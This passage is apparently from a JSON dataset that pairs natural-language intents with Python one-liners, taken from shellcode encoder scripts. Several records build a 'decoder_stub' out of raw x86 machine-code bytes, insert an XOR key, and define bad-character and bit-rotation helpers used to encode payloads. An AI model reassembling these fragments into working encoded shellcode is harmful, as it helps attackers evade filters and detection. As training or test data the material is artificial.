      "%",
      "x"
    ]
  },
  {
    "intent": "add the string value '0x' to the variable decoded",
    "rewritten_intent": "add the string value '0x' to the variable decoded",
    "snippet": "decoded2 += '0x'",
    "slot_map": {
      "'0x'": "var0"
    },
    "intent_tokens": [
      "add",
      "string",
      "value",
      "var0",
      "to",
      "variable",
      "decoded"
    ],
    "snippet_tokens": [
      "decoded2",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "initialize an empty string variable called decoded2",
    "rewritten_intent": "initialize an empty string variable called decoded2",
    "snippet": "decoded2 = \"\"",
    "slot_map": {
      "decoded2": "var0"
    },
    "intent_tokens": [
      "initialize",
      "empty",
      "string",
      "variable",
      "called",
      "var0"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "``"
    ]
  },
  {
    "intent": "append '\\x02\\xeb\\xe4\\xe8\\xdc\\xff\\xff\\xff' to decoder_stub",
    "rewritten_intent": "append '\\x02\\xeb\\xe4\\xe8\\xdc\\xff\\xff\\xff' to decoder_stub",
    "snippet": "decoder_stub += '\\x02\\xeb\\xe4\\xe8\\xdc\\xff\\xff\\xff'",
    "slot_map": {
      "'\\x02\\xeb\\xe4\\xe8\\xdc\\xff\\xff\\xff'": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "append",
      "var0",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "``",
      "\\x02\\xeb\\xe4\\xe8\\xdc\\xff\\xff\\xff",
      "''"
    ]
  },
  {
    "intent": "concatenate the string '\\x1c\\x0f\\x88\\xdf\\x88\\xd0\\x30\\xd8' to decoder_stub",
    "rewritten_intent": "concatenate the string '\\x1c\\x0f\\x88\\xdf\\x88\\xd0\\x30\\xd8' to decoder_stub",
    "snippet": "decoder_stub += '\\x1c\\x0f\\x88\\xdf\\x88\\xd0\\x30\\xd8'",
    "slot_map": {
      "'\\x1c\\x0f\\x88\\xdf\\x88\\xd0\\x30\\xd8'": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "concatenate",
      "string",
      "var0",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "``",
      "\\x1c\\x0f\\x88\\xdf\\x88\\xd0\\x30\\xd8",
      "''"
    ]
  },
  {
    "intent": "append '\\x31\\xd8\\x66\\x89\\x07\\x41\\x8d\\x7f' to decoder_stub",
    "rewritten_intent": "append '\\x31\\xd8\\x66\\x89\\x07\\x41\\x8d\\x7f' to decoder_stub",
    "snippet": "decoder_stub += '\\x31\\xd8\\x66\\x89\\x07\\x41\\x8d\\x7f'",
    "slot_map": {
      "'\\x31\\xd8\\x66\\x89\\x07\\x41\\x8d\\x7f'": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "append",
      "var0",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "``",
      "\\x31\\xd8\\x66\\x89\\x07\\x41\\x8d\\x7f",
      "''"
    ]
  },
  {
    "intent": "append the string '\\x74\\x16\\x66\\x8b\\x44\\x0f\\x01\\x66' to decoder_stub",
    "rewritten_intent": "append the string '\\x74\\x16\\x66\\x8b\\x44\\x0f\\x01\\x66' to decoder_stub",
    "snippet": "decoder_stub += '\\x74\\x16\\x66\\x8b\\x44\\x0f\\x01\\x66'",
    "slot_map": {
      "'\\x74\\x16\\x66\\x8b\\x44\\x0f\\x01\\x66'": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "append",
      "string",
      "var0",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "``",
      "\\x74\\x16\\x66\\x8b\\x44\\x0f\\x01\\x66",
      "''"
    ]
  },
  {
    "intent": "concatenate '\\xb2\\x45\\xeb\\x1f\\x5e\\x8d\\x3e\\x8a' to decoder_stub",
    "rewritten_intent": "concatenate '\\xb2\\x45\\xeb\\x1f\\x5e\\x8d\\x3e\\x8a' to decoder_stub",
    "snippet": "decoder_stub += '\\xb2\\x45\\xeb\\x1f\\x5e\\x8d\\x3e\\x8a'",
    "slot_map": {
      "'\\xb2\\x45\\xeb\\x1f\\x5e\\x8d\\x3e\\x8a'": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "concatenate",
      "var0",
      "to",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "``",
      "\\xb2\\x45\\xeb\\x1f\\x5e\\x8d\\x3e\\x8a",
      "''"
    ]
  },
  {
    "intent": "add the string \"\\x31\\xd2\\x5e\\xbf\\x90\\x90\\xaa\\xaa\" to the variable decoder_stub",
    "rewritten_intent": "add the string \"\\x31\\xd2\\x5e\\xbf\\x90\\x90\\xaa\\xaa\" to the variable decoder_stub",
    "snippet": "decoder_stub += \"\\x31\\xd2\\x5e\\xbf\\x90\\x90\\xaa\\xaa\"",
    "slot_map": {
      "\"\\x31\\xd2\\x5e\\xbf\\x90\\x90\\xaa\\xaa\"": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string \"\\x3c\\x16\\x32\\x0c\\x16\\x32\\x2c\\x16\" to the variable decoder_stub",
    "rewritten_intent": "add the string \"\\x3c\\x16\\x32\\x0c\\x16\\x32\\x2c\\x16\" to the variable decoder_stub",
    "snippet": "decoder_stub += \"\\x3c\\x16\\x32\\x0c\\x16\\x32\\x2c\\x16\"",
    "slot_map": {
      "\"\\x3c\\x16\\x32\\x0c\\x16\\x32\\x2c\\x16\"": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string \"\\x42\\x42\\x83\\xc0\\x04\\x75\\xc5\\xff\" to the variable decoder_stub",
    "rewritten_intent": "add the string \"\\x42\\x42\\x83\\xc0\\x04\\x75\\xc5\\xff\" to the variable decoder_stub",
    "snippet": "decoder_stub += \"\\x42\\x42\\x83\\xc0\\x04\\x75\\xc5\\xff\"",
    "slot_map": {
      "\"\\x42\\x42\\x83\\xc0\\x04\\x75\\xc5\\xff\"": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string \"\\x7c\\x04\\x02\\x88\\x5c\\x04\\x03\\x39\" to the variable decoder_stub",
    "rewritten_intent": "add the string \"\\x7c\\x04\\x02\\x88\\x5c\\x04\\x03\\x39\" to the variable decoder_stub",
    "snippet": "decoder_stub += \"\\x7c\\x04\\x02\\x88\\x5c\\x04\\x03\\x39\"",
    "slot_map": {
      "\"\\x7c\\x04\\x02\\x88\\x5c\\x04\\x03\\x39\"": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string \"\\x7c\\x16\\x05\\x74\\x0a\\x42\\x42\\x42\" to the variable decoder_stub",
    "rewritten_intent": "add the string \"\\x7c\\x16\\x05\\x74\\x0a\\x42\\x42\\x42\" to the variable decoder_stub",
    "snippet": "decoder_stub += \"\\x7c\\x16\\x05\\x74\\x0a\\x42\\x42\\x42\"",
    "slot_map": {
      "\"\\x7c\\x16\\x05\\x74\\x0a\\x42\\x42\\x42\"": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string \"\\x7f\\x83\\xec\\x7f\\x8a\\x5c\\x16\\x01\" to the variable decoder_stub",
    "rewritten_intent": "add the string \"\\x7f\\x83\\xec\\x7f\\x8a\\x5c\\x16\\x01\" to the variable decoder_stub",
    "snippet": "decoder_stub += \"\\x7f\\x83\\xec\\x7f\\x8a\\x5c\\x16\\x01\"",
    "slot_map": {
      "\"\\x7f\\x83\\xec\\x7f\\x8a\\x5c\\x16\\x01\"": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string \"\\x83\\xec\\x7f\\x83\\xec\\x7f\\x83\\xec\" to the variable decoder_stub",
    "rewritten_intent": "add the string \"\\x83\\xec\\x7f\\x83\\xec\\x7f\\x83\\xec\" to the variable decoder_stub",
    "snippet": "decoder_stub += \"\\x83\\xec\\x7f\\x83\\xec\\x7f\\x83\\xec\"",
    "slot_map": {
      "\"\\x83\\xec\\x7f\\x83\\xec\\x7f\\x83\\xec\"": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string \"\\x88\\x2c\\x04\\x88\\x4c\\x04\\x01\\x88\" to the variable decoder_stub",
    "rewritten_intent": "add the string \"\\x88\\x2c\\x04\\x88\\x4c\\x04\\x01\\x88\" to the variable decoder_stub",
    "snippet": "decoder_stub += \"\\x88\\x2c\\x04\\x88\\x4c\\x04\\x01\\x88\"",
    "slot_map": {
      "\"\\x88\\x2c\\x04\\x88\\x4c\\x04\\x01\\x88\"": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string \"\\x8a\\x6c\\x16\\x04\\x32\\x1c\\x16\\x32\" to the variable decoder_stub",
    "rewritten_intent": "add the string \"\\x8a\\x6c\\x16\\x04\\x32\\x1c\\x16\\x32\" to the variable decoder_stub",
    "snippet": "decoder_stub += \"\\x8a\\x6c\\x16\\x04\\x32\\x1c\\x16\\x32\"",
    "slot_map": {
      "\"\\x8a\\x6c\\x16\\x04\\x32\\x1c\\x16\\x32\"": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string \"\\x8a\\x7c\\x16\\x02\\x8a\\x4c\\x16\\x03\" to the variable decoder_stub",
    "rewritten_intent": "add the string \"\\x8a\\x7c\\x16\\x02\\x8a\\x4c\\x16\\x03\" to the variable decoder_stub",
    "snippet": "decoder_stub += \"\\x8a\\x7c\\x16\\x02\\x8a\\x4c\\x16\\x03\"",
    "slot_map": {
      "\"\\x8a\\x7c\\x16\\x02\\x8a\\x4c\\x16\\x03\"": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "add the string \"\\xe4\\xe8\\xa4\\xff\\xff\\xff\" to the variable decoder_stub",
    "rewritten_intent": "add the string \"\\xe4\\xe8\\xa4\\xff\\xff\\xff\" to the variable decoder_stub",
    "snippet": "decoder_stub += \"\\xe4\\xe8\\xa4\\xff\\xff\\xff\"",
    "slot_map": {
      "\"\\xe4\\xe8\\xa4\\xff\\xff\\xff\"": "var0",
      "decoder_stub": "var1"
    },
    "intent_tokens": [
      "add",
      "string",
      "var0",
      "to",
      "variable",
      "var1"
    ],
    "snippet_tokens": [
      "var1",
      "+=",
      "var0"
    ]
  },
  {
    "intent": "decoder_stub is the string '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'",
    "rewritten_intent": "decoder_stub is the string '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'",
    "snippet": "decoder_stub = '\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'",
    "slot_map": {
      "'\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2'": "var1",
      "decoder_stub": "var0"
    },
    "intent_tokens": [
      "var0",
      "is",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "``",
      "\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2",
      "''"
    ]
  },
  {
    "intent": "initialize the variable decoder_stub to \"\\xeb\\x57\\x31\\xc0\\x31\\xdb\\x31\\xc9\"",
    "rewritten_intent": "initialize the variable decoder_stub to \"\\xeb\\x57\\x31\\xc0\\x31\\xdb\\x31\\xc9\"",
    "snippet": "decoder_stub = \"\\xeb\\x57\\x31\\xc0\\x31\\xdb\\x31\\xc9\"",
    "slot_map": {
      "\"\\xeb\\x57\\x31\\xc0\\x31\\xdb\\x31\\xc9\"": "var2",
      "decoder_stub": "var0"
    },
    "intent_tokens": [
      "initialize",
      "variable",
      "var0",
      "to",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var2"
    ]
  },
  {
    "intent": "in decoder_stub replace '\\x45' with bytes object containing the value xor_byte packed according to the format string unsigned char",
    "rewritten_intent": "in decoder_stub replace '\\x45' with bytes object containing the value xor_byte packed according to the format string unsigned char",
    "snippet": "decoder_stub = decoder_stub.replace('\\x45', struct.pack('B', xor_byte))",
    "slot_map": {
      "'\\x45'": "var2",
      "decoder_stub": "var0",
      "xor_byte": "var3"
    },
    "intent_tokens": [
      "in",
      "var0",
      "replace",
      "var2",
      "with",
      "bytes",
      "object",
      "containing",
      "value",
      "var3",
      "packed",
      "according",
      "to",
      "format",
      "string",
      "unsigned",
      "char"
    ],
    "snippet_tokens": [
      "var0",
      "=",
      "var0.replace",
      "(",
      "``",
      "\\x45",
      "''",
      ",",
      "struct.pack",
      "(",
      "``",
      "B",
      "''",
      ",",
      "var3",
      ")",
      ")"
    ]
  },
  {
    "intent": "for each element in decoder_stub convert the element to an integer representing the unicode then convert it to a hexadecimal ignore slice at index 2 until the end and join separating each element by the string '\\\\x'",
    "rewritten_intent": "for each element in decoder_stub convert the element to an integer representing the unicode then convert it to a hexadecimal ignore slice at index 2 until the end and join separating each element by the string '\\\\x'",
    "snippet": "decoder_stub_hex = ''.join('\\\\x{}'.format(hex(ord(x))[2:]) for x in decoder_stub)",
    "slot_map": {
      "'\\\\x'": "var4",
      "decoder_stub": "var0",
      "unicode": "var2",
      "until": "var3"
    },
    "intent_tokens": [
      "for",
      "each",
      "element",
      "in",
      "var0",
      "convert",
      "element",
      "to",
      "integer",
      "representing",
      "var2",
      "then",
      "convert",
      "it",
      "to",
      "hexadecimal",
      "ignore",
      "slice",
      "at",
      "index",
      "2",
      "var3",
      "end",
      "and",
      "join",
      "separating",
      "each",
      "element",
      "by",
      "string",
      "var4"
    ],
    "snippet_tokens": [
      "decoder_stub_hex",
      "=",
      "``",
      "''",
      ".join",
      "(",
      "``",
      "\\\\x",
      "{",
      "}",
      "''",
      ".format",
      "(",
      "hex",
      "(",
      "ord",
      "(",
      "x",
      ")",
      ")",
      "[",
      "2",
      ":",
      "]",
      ")",
      "for",
      "x",
      "in",
      "var0",
      ")"
    ]
  },
  {
    "intent": "define the function find_valid_xor_byte with input parameters bytes and bad_chars",
    "rewritten_intent": "define the function find_valid_xor_byte with input parameters bytes and bad_chars",
    "snippet": "def find_valid_xor_byte(bytes, bad_chars):",
    "slot_map": {
      "find_valid_xor_byte": "var0",
      "bad_chars": "var1"
    },
    "intent_tokens": [
      "define",
      "function",
      "var0",
      "with",
      "input",
      "parameters",
      "bytes",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "def",
      "var0",
      "(",
      "bytes",
      ",",
      "var1",
      ")",
      ":"
    ]
  },
  {
    "intent": "define a method named mask that takes in n as a parameter",
    "rewritten_intent": "define a method named mask that takes in n as a parameter",
    "snippet": "def mask(n):",
    "slot_map": {
      "that": "var0"
    },
    "intent_tokens": [
      "define",
      "method",
      "named",
      "mask",
      "var0",
      "takes",
      "in",
      "n",
      "as",
      "parameter"
    ],
    "snippet_tokens": [
      "def",
      "mask",
      "(",
      "n",
      ")",
      ":"
    ]
  },
  {
    "intent": "define a method named rol with the parameters n, rotations, and width. Width has a default value of 8",
    "rewritten_intent": "define a method named rol with the parameters n, rotations, and width. Width has a default value of 8",
    "snippet": "def rol(n, rotations, width=8):",
    "slot_map": {
      "Width": "var1",
      "rol": "var0"
    },
    "intent_tokens": [
      "define",
      "method",
      "named",
      "var0",
      "with",
      "parameters",
      "n",
      ",",
      "rotations",
      ",",
      "and",
      "width",
      "var1",
      "has",
      "default",
      "value",
      "of",
      "8"
    ],
    "snippet_tokens": [
      "def",
      "var0",
      "(",
      "n",
      ",",
      "rotations",
      ",",
      "width=8",
      ")",
      ":"
    ]
  },
  {
    "intent": "define a method named ror with the parameters n, rotations, and width. Width has a default value of 8",
    "rewritten_intent": "define a method named ror with the parameters n, rotations, and width. Width has a default value of 8",
    "snippet": "def ror(n, rotations, width=8):",
    "slot_map": {
      "Width": "var1",
      "ror": "var0"
    },
    "intent_tokens": [
      "define",
      "method",
      "named",
      "var0",
      "with",
      "parameters",
      "n",
      ",",
      "rotations",
      ",",
      "and",
      "width",
      "var1",
      "has",
      "default",
      "value",
      "of",
      "8"
    ],
    "snippet_tokens": [
      "def",
      "var0",
      "(",
      "n",
      ",",
      "rotations",
      ",",
      "width=8",
      ")",
      ":"
    ]
  },
  {
    "intent": "else if xxx is equal to the string '0x0'",
    "rewritten_intent": "else if xxx is equal to the string '0x0'",
    "snippet": "elif xxx == '0x0':",
    "slot_map": {
      "'0x0'": "var0"
    },
    "intent_tokens": [
      "else",
      "if",
      "xxx",
      "is",
      "equal",
      "to",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "elif",
      "xxx",
      "==",
      "var0",
      ":"
    ]
  },
  {
    "intent": "else",
    "rewritten_intent": "else",
    "snippet": "else:",
    "slot_map": {},
    "intent_tokens": [
      "else"
    ],
    "snippet_tokens": [
      "else",
      ":"
    ]
  },
  {
    "intent": "declare an else statement",
    "rewritten_intent": "declare an else statement",
    "snippet": "else:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "else",
      "statement"
    ],
    "snippet_tokens": [
      "else",
      ":"
    ]
  },
  {
    "intent": "convert the value x in hexadecimal and append it to the string encode followed by ','",
    "rewritten_intent": "convert the value x in hexadecimal and append it to the string encode followed by ','",
    "snippet": "encode += '%02x,'%x",
    "slot_map": {
      "','": "var0"
    },
    "intent_tokens": [
      "convert",
      "value",
      "x",
      "in",
      "hexadecimal",
      "and",
      "append",
      "it",
      "to",
      "string",
      "encode",
      "followed",
      "by",
      "var0"
    ],
    "snippet_tokens": [
      "encode",
      "+=",
      "'",
      "%",
      "02x",
      ",",
      "'",
      "%",
      "x"
    ]
  },
  {
    "intent": "append 0x to encode",
    "rewritten_intent": "append 0x to encode",
    "snippet": "encode += '0x'",
    "slot_map": {},
    "intent_tokens": [
      "append",
      "0x",
      "to",
      "encode"
    ],
    "snippet_tokens": [
      "encode",
      "+=",
      "'0x",
      "'"
    ]
  },
  {
    "intent": "append 0xAA to encode",
    "rewritten_intent": "append 0xAA to encode",
    "snippet": "encode += '0xAA,'",
    "slot_map": {},
    "intent_tokens": [
      "append",
      "0xAA",
      "to",
      "encode"
    ],
    "snippet_tokens": [
      "encode",
      "+=",
      "'0xAA",
      ",",
      "'"
    ]
  },
  {
    "intent": "encode is an empty string",
    "rewritten_intent": "encode is an empty string",
    "snippet": "encode = \"\"",
    "slot_map": {},
    "intent_tokens": [
      "encode",
      "is",
      "empty",
      "string"
    ],
    "snippet_tokens": [
      "encode",
      "=",
      "``"
    ]
  },
  {
    "intent": "append string '\\\\x' to encoded",
    "rewritten_intent": "append string '\\\\x' to encoded",
    "snippet": "encoded += '\\\\x'",
    "slot_map": {
      "'\\\\x'": "var0"
    },
    "intent_tokens": [
      "append",
      "string",
      "var0",
      "to",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "``",
      "\\\\x",
      "''"
    ]
  },
  {
    "intent": "append '\\\\x' to the string encoded",
    "rewritten_intent": "append '\\\\x' to the string encoded",
    "snippet": "encoded += '\\\\x'",
    "slot_map": {
      "'\\\\x'": "var0"
    },
    "intent_tokens": [
      "append",
      "var0",
      "to",
      "string",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "``",
      "\\\\x",
      "''"
    ]
  },
  {
    "intent": "add the string value '\\\\x' to the variable encoded",
    "rewritten_intent": "add the string value '\\\\x' to the variable encoded",
    "snippet": "encoded += '\\\\x'",
    "slot_map": {
      "'\\\\x'": "var0"
    },
    "intent_tokens": [
      "add",
      "string",
      "value",
      "var0",
      "to",
      "variable",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "``",
      "\\\\x",
      "''"
    ]
  },
  {
    "intent": "append string '\\\\x' followed by the conversion in hex of 0xAA to the string encoded",
    "rewritten_intent": "append string '\\\\x' followed by the conversion in hex of 0xAA to the string encoded",
    "snippet": "encoded += '\\\\x%02x' % 0xAA",
    "slot_map": {
      "'\\\\x'": "var0"
    },
    "intent_tokens": [
      "append",
      "string",
      "var0",
      "followed",
      "by",
      "conversion",
      "in",
      "hex",
      "of",
      "0xAA",
      "to",
      "string",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'\\\\x",
      "%",
      "02x",
      "'",
      "%",
      "0xAA"
    ]
  },
  {
    "intent": "Convert the variable rand to a hexadecimal and add it to the variable encoded",
    "rewritten_intent": "Convert the variable rand to a hexadecimal and add it to the variable encoded",
    "snippet": "encoded += '\\\\x%02x' % rand",
    "slot_map": {},
    "intent_tokens": [
      "Convert",
      "variable",
      "rand",
      "to",
      "hexadecimal",
      "and",
      "add",
      "it",
      "to",
      "variable",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'\\\\x",
      "%",
      "02x",
      "'",
      "%",
      "rand"
    ]
  },
  {
    "intent": "convert to hexadecimal a random integer between 1 and 169 and append it to the string encoded",
    "rewritten_intent": "convert to hexadecimal a random integer between 1 and 169 and append it to the string encoded",
    "snippet": "encoded += '\\\\x%02x' % random.randint(1,169)",
    "slot_map": {},
    "intent_tokens": [
      "convert",
      "to",
      "hexadecimal",
      "random",
      "integer",
      "between",
      "1",
      "and",
      "169",
      "and",
      "append",
      "it",
      "to",
      "string",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'\\\\x",
      "%",
      "02x",
      "'",
      "%",
      "random.randint",
      "(",
      "1,169",
      ")"
    ]
  },
  {
    "intent": "append string '\\\\xbb' to encoded",
    "rewritten_intent": "append string '\\\\xbb' to encoded",
    "snippet": "encoded += '\\\\xbb'",
    "slot_map": {
      "'\\\\xbb'": "var0"
    },
    "intent_tokens": [
      "append",
      "string",
      "var0",
      "to",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "``",
      "\\\\xbb",
      "''"
    ]
  },
  {
    "intent": "append string '\\\\xcc' to encoded",
    "rewritten_intent": "append string '\\\\xcc' to encoded",
    "snippet": "encoded += '\\\\xcc'",
    "slot_map": {
      "'\\\\xcc'": "var0"
    },
    "intent_tokens": [
      "append",
      "string",
      "var0",
      "to",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "``",
      "\\\\xcc",
      "''"
    ]
  },
  {
    "intent": "append to the string encoded the hexadecimal conversion of the and operation between h and 0xff",
    "rewritten_intent": "append to the string encoded the hexadecimal conversion of the and operation between h and 0xff",
    "snippet": "encoded += '%02x' % (h & 0xff)",
    "slot_map": {},
    "intent_tokens": [
      "append",
      "to",
      "string",
      "encoded",
      "hexadecimal",
      "conversion",
      "of",
      "and",
      "operation",
      "between",
      "h",
      "and",
      "0xff"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "(",
      "h",
      "&",
      "255",
      ")"
    ]
  },
  {
    "intent": "append to the string encoded the hexadecimal conversion of the and operation between x and 0xff",
    "rewritten_intent": "append to the string encoded the hexadecimal conversion of the and operation between x and 0xff",
    "snippet": "encoded += '%02x' % (x & 0xff)",
    "slot_map": {},
    "intent_tokens": [
      "append",
      "to",
      "string",
      "encoded",
      "hexadecimal",
      "conversion",
      "of",
      "and",
      "operation",
      "between",
      "x",
      "and",
      "0xff"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "(",
      "x",
      "&",
      "255",
      ")"
    ]
  },
  {
    "intent": "perform the and operation between y and 0xff, then convert the result in hexadecimal and append it to the string encoded",
    "rewritten_intent": "perform the and operation between y and 0xff, then convert the result in hexadecimal and append it to the string encoded",
    "snippet": "encoded += '%02x' % (y & 0xff)",
    "slot_map": {
      "0xff": "var0"
    },
    "intent_tokens": [
      "perform",
      "and",
      "operation",
      "between",
      "y",
      "and",
      "var0",
      "then",
      "convert",
      "result",
      "in",
      "hexadecimal",
      "and",
      "append",
      "it",
      "to",
      "string",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "(",
      "y",
      "&",
      "var0",
      ")"
    ]
  },
  {
    "intent": "append the value x converted in hex to the string encoded",
    "rewritten_intent": "append the value x converted in hex to the string encoded",
    "snippet": "encoded += '%02x' % x",
    "slot_map": {},
    "intent_tokens": [
      "append",
      "value",
      "x",
      "converted",
      "in",
      "hex",
      "to",
      "string",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "x"
    ]
  },
  {
    "intent": "Convert the variable x to a hexadecimal and add it to the variable encoded",
    "rewritten_intent": "Convert the variable x to a hexadecimal and add it to the variable encoded",
    "snippet": "encoded += '%02x' % x",
    "slot_map": {},
    "intent_tokens": [
      "Convert",
      "variable",
      "x",
      "to",
      "hexadecimal",
      "and",
      "add",
      "it",
      "to",
      "variable",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "x"
    ]
  },
  {
    "intent": "append the value y converted in hex to the string encoded",
    "rewritten_intent": "append the value y converted in hex to the string encoded",
    "snippet": "encoded += '%02x' % y",
    "slot_map": {},
    "intent_tokens": [
      "append",
      "value",
      "y",
      "converted",
      "in",
      "hex",
      "to",
      "string",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "y"
    ]
  },
  {
    "intent": "Convert the value of y to hex and append it to the variable encoded",
    "rewritten_intent": "Convert the value of y to hex and append it to the variable encoded",
    "snippet": "encoded += '%02x' % y",
    "slot_map": {},
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "y",
      "to",
      "hex",
      "and",
      "append",
      "it",
      "to",
      "variable",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "y"
    ]
  },
  {
    "intent": "Convert the value of y to a hexadecimal then add it to the variable encoded",
    "rewritten_intent": "Convert the value of y to a hexadecimal then add it to the variable encoded",
    "snippet": "encoded += '%02x' % y",
    "slot_map": {},
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "y",
      "to",
      "hexadecimal",
      "then",
      "add",
      "it",
      "to",
      "variable",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "y"
    ]
  },
  {
    "intent": "append to the string encoded the value (7 - (256 -x)) converted to hexadecimal",
    "rewritten_intent": "append to the string encoded the value (7 - (256 -x)) converted to hexadecimal",
    "snippet": "encoded += '%02x' %(7 -(256 - x))",
    "slot_map": {
      "-": "var0",
      "-x": "var1"
    },
    "intent_tokens": [
      "append",
      "to",
      "string",
      "encoded",
      "value",
      "(",
      "7",
      "var0",
      "(",
      "256",
      "-x",
      ")",
      ")",
      "converted",
      "to",
      "hexadecimal"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "``",
      "%",
      "02x",
      "''",
      "%",
      "(",
      "7",
      "-",
      "(",
      "256",
      "var0",
      "x",
      ")",
      ")"
    ]
  },
  {
    "intent": "convert (x+7) to hexadecimal and append it to the string encoded",
    "rewritten_intent": "convert (x+7) to hexadecimal and append it to the string encoded",
    "snippet": "encoded += '%02x'%(x+7)",
    "slot_map": {
      "x+7": "var0"
    },
    "intent_tokens": [
      "convert",
      "(",
      "x+7",
      ")",
      "to",
      "hexadecimal",
      "and",
      "append",
      "it",
      "to",
      "string",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "'",
      "%",
      "02x",
      "'",
      "%",
      "var0"
    ]
  },
  {
    "intent": "Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded",
    "rewritten_intent": "Convert the value of leader to hexadecimal, then slice it at the index of 2 and add its value to the variable encoded",
    "snippet": "encoded += hex(leader)[2:]",
    "slot_map": {},
    "intent_tokens": [
      "Convert",
      "value",
      "of",
      "leader",
      "to",
      "hexadecimal",
      ",",
      "then",
      "slice",
      "it",
      "at",
      "index",
      "of",
      "2",
      "and",
      "add",
      "its",
      "value",
      "to",
      "variable",
      "encoded"
    ],
    "snippet_tokens": [
      "encoded",
      "+=",
      "hex",
      "(",
      "leader",
      ")",
      "[",
      "2",
      ":",
      "]"
    ]
  },
  {
    "intent": "slice the variable insertByte at index 2 and add the value to the variable encoded",
    "rewritten_intent": "slice the variable insertByte at index 2 and add the value to the variable encoded",
